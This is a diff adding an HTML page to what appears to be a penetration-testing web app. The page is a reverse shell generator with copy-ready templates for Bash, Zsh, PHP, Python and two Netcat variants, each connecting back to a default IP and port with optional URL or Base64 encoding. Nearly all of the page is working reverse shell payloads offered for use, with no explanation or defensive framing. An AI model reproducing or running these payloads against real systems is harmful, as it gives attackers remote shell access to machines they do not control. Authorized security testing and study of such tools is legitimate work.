@@ -1,0 +1,148 @@
+<section class="page active reverse-shell-page">
+  <h1>Reverse Shell</h1>
+  <p class="intro">
+    Choose a shell type, set the IP and port, and copy the generated payload.
+  </p>
+
+  <div class="input-row rs-control-row">
+    <input class="input input-bordered input-sm border-base-300 bg-base-100 rs-input rs-ip focus:border-primary" value="192.168.45.166" aria-label="IP address" placeholder="IP">
+    <input class="input input-bordered input-sm border-base-300 bg-base-100 rs-input rs-port focus:border-primary" value="4444" aria-label="Port" placeholder="Port">
+    <select id="rsShellType" class="select select-bordered select-sm border-base-300 bg-base-100 rs-select focus:border-primary" aria-label="Shell type">
+      <option value="bash">Bash</option>
+      <option value="zsh">Zsh</option>
+      <option value="php">PHP</option>
+      <option value="python">Python</option>
+      <option value="netcat">Netcat</option>
+    </select>
+  </div>
+
+  <div class="rs-shell-section" data-shell="bash">
+    <div class="section-title">
+      <span></span>
+      <h2>Bash</h2>
+      <span></span>
+    </div>
+
+    <div class="payload-block">
+      <div class="payload-box">
+        <code class="copy-text rs-payload" data-template="bash -c 'exec bash -i &amp;&gt;/dev/tcp/{IP}/{PORT} &lt;&amp;1'"></code>
+        <button class="copy-icon" type="button" title="Copy">Copy</button>
+      </div>
+      <div class="encoding-row">
+        <label class="encoding-label">Encoding</label>
+        <select class="select select-bordered select-xs border-base-300 bg-base-100 rs-encoding-select focus:border-primary" aria-label="Payload encoding">
+          <option value="raw">None</option>
+          <option value="url">URL</option>
+          <option value="base64">Base64</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="rs-shell-section" data-shell="zsh" hidden>
+    <div class="section-title">
+      <span></span>
+      <h2>Zsh</h2>
+      <span></span>
+    </div>
+
+    <div class="payload-block">
+      <div class="payload-box">
+        <code class="copy-text rs-payload" data-template="zsh -c 'zmodload zsh/net/tcp &amp;&amp; ztcp {IP} {PORT} &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY'"></code>
+        <button class="copy-icon" type="button" title="Copy">Copy</button>
+      </div>
+      <div class="encoding-row">
+        <label class="encoding-label">Encoding</label>
+        <select class="select select-bordered select-xs border-base-300 bg-base-100 rs-encoding-select focus:border-primary" aria-label="Payload encoding">
+          <option value="raw">None</option>
+          <option value="url">URL</option>
+          <option value="base64">Base64</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="rs-shell-section" data-shell="php" hidden>
+    <div class="section-title">
+      <span></span>
+      <h2>PHP</h2>
+      <span></span>
+    </div>
+
+    <div class="payload-block">
+      <div class="payload-box">
+        <code class="copy-text rs-payload" data-template="php -r '$sock=fsockopen(&quot;{IP}&quot;,{PORT});exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'"></code>
+        <button class="copy-icon" type="button" title="Copy">Copy</button>
+      </div>
+      <div class="encoding-row">
+        <label class="encoding-label">Encoding</label>
+        <select class="select select-bordered select-xs border-base-300 bg-base-100 rs-encoding-select focus:border-primary" aria-label="Payload encoding">
+          <option value="raw">None</option>
+          <option value="url">URL</option>
+          <option value="base64">Base64</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="rs-shell-section" data-shell="python" hidden>
+    <div class="section-title">
+      <span></span>
+      <h2>Python</h2>
+      <span></span>
+    </div>
+
+    <div class="payload-block">
+      <div class="payload-box">
+        <code class="copy-text rs-payload" data-template="python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;{IP}&quot;,{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'"></code>
+        <button class="copy-icon" type="button" title="Copy">Copy</button>
+      </div>
+      <div class="encoding-row">
+        <label class="encoding-label">Encoding</label>
+        <select class="select select-bordered select-xs border-base-300 bg-base-100 rs-encoding-select focus:border-primary" aria-label="Payload encoding">
+          <option value="raw">None</option>
+          <option value="url">URL</option>
+          <option value="base64">Base64</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="rs-shell-section" data-shell="netcat" hidden>
+    <div class="section-title">
+      <span></span>
+      <h2>Netcat</h2>
+      <span></span>
+    </div>
+
+    <div class="payload-block">
+      <div class="payload-box">
+        <code class="copy-text rs-payload" data-template="nc -e /bin/sh {IP} {PORT}"></code>
+        <button class="copy-icon" type="button" title="Copy">Copy</button>
+      </div>
+      <div class="encoding-row">
+        <label class="encoding-label">Encoding</label>
+        <select class="select select-bordered select-xs border-base-300 bg-base-100 rs-encoding-select focus:border-primary" aria-label="Payload encoding">
+          <option value="raw">None</option>
+          <option value="url">URL</option>
+          <option value="base64">Base64</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="payload-block">
+      <div class="payload-box">
+        <code class="copy-text rs-payload" data-template="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {IP} {PORT} &gt;/tmp/f"></code>
+        <button class="copy-icon" type="button" title="Copy">Copy</button>
+      </div>
+      <div class="encoding-row">
+        <label class="encoding-label">Encoding</label>
+        <select class="select select-bordered select-xs border-base-300 bg-base-100 rs-encoding-select focus:border-primary" aria-label="Payload encoding">
+          <option value="raw">None</option>
+          <option value="url">URL</option>
+          <option value="base64">Base64</option>
+        </select>
+      </div>
+    </div>
+  </div>
+</section>
